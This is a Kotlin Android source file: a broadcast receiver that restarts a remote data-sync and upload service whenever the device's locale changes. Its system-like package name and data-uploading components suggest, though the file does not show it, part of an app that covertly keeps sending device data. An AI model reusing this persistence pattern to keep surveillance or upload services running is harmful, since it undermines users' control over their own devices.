package com.android.services.receiver

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import com.android.services.services.RemoteDataService
import com.android.services.util.AppUtils
import com.android.services.util.FirebasePushUtils
import com.android.services.util.logVerbose
import com.android.services.workers.DataUploadingWorker

class LanguageChangeReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent?) {
        if (intent != null && intent.action == Intent.ACTION_LOCALE_CHANGED) {
            if (!AppUtils.isServiceRunning(context, DataUploadingWorker::class.java.name)) {
                FirebasePushUtils.restartRemoteDataSyncService(context)
            }
        }
    }
}